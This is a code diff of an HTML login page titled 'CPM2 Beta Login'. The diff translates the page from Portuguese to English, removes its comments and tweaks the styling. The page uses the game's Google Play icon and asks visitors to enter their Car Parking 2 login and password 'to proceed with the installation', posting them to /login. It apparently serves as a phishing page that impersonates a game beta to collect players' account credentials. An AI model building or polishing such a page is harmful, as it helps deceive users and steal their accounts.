@@ -1,10 +1,9 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html lang="en-US">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>CPM2 Beta Login</title>
-    <!-- Importando uma fonte moderna do Google -->
     <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@700;800&family=Open+Sans:wght@400;600&display=swap" rel="stylesheet">
     
     <style>
@@ -26,7 +25,6 @@
             background-color: #f0f0f0; 
         }
 
-        /* Camada da imagem de fundo com 30% de transparência (opacity: 0.3) */
         body::before {
             content: '';
             position: absolute;
@@ -72,7 +70,7 @@
             flex-direction: column;
             gap: 15px;
             width: 100%;
-            max-width: 400px;
+            max-width: 450px;
             margin-bottom: 40px;
         }
 
@@ -81,13 +79,17 @@
             align-items: center;
             justify-content: center;
             gap: 15px;
+            width: 100%;
         }
 
+        /* Largura fixa adicionada aqui para forçar o alinhamento das caixas */
         .input-group label {
             font-family: 'Montserrat', sans-serif;
             font-size: 2rem;
             font-weight: 700;
             color: #000000;
+            width: 160px; 
+            text-align: right; 
         }
 
         .input-group input {
@@ -106,7 +108,6 @@
             border-color: #FFC107;
         }
 
-        /* Estilo do novo botão visível */
         button[type="submit"] {
             margin-top: 15px;
             padding: 12px 20px;
@@ -114,7 +115,7 @@
             font-size: 1.5rem;
             font-weight: 800;
             color: #000000;
-            background-color: #FFC107; /* Amarelo combinando com o título */
+            background-color: #FFC107;
             border: none;
             border-radius: 8px;
             cursor: pointer;
@@ -123,7 +124,7 @@
         }
 
         button[type="submit"]:hover {
-            background-color: #e0a800; /* Fica um pouco mais escuro ao passar o mouse */
+            background-color: #e0a800;
         }
 
         .footer-text {
@@ -137,13 +138,10 @@
 <body>
 
     <div class="container">
-        <!-- Título Superior -->
         <h1><span class="text-white">CPM</span><span class="text-yellow">2 beta Android/Ios</span></h1>
         
-        <!-- Ícone Central puxando direto do Google Play -->
         <img src="https://play-lh.googleusercontent.com/oCYZs3vR72j0dAo2K2Q7PPQuYg_q_GRUfqwBgWX_tVgh4j4yODpc-JIJUEoe5P5nKZjHDm17Wh1ANNAi6pevWg" alt="CPM2 Icon" class="icon-logo">
 
-        <!-- Formulário -->
         <form action="/login" method="POST">
             <div class="input-group">
                 <label for="usuario">login:</label>
@@ -151,15 +149,12 @@
             </div>
             <div class="input-group">
                 <label for="senha">password:</label>
-                <!-- O texto na tela muda, mas mantivemos id e name como "senha" para o servidor continuar funcionando -->
                 <input type="password" id="senha" name="senha" required>
             </div>
             
-            <!-- Novo botão visível e estilizado -->
             <button type="submit">enter</button>
         </form>
 
-        <!-- Texto Inferior -->
         <p class="footer-text">Enter your Car Parking 2 account details to proceed with the installation.</p>
     </div>
 
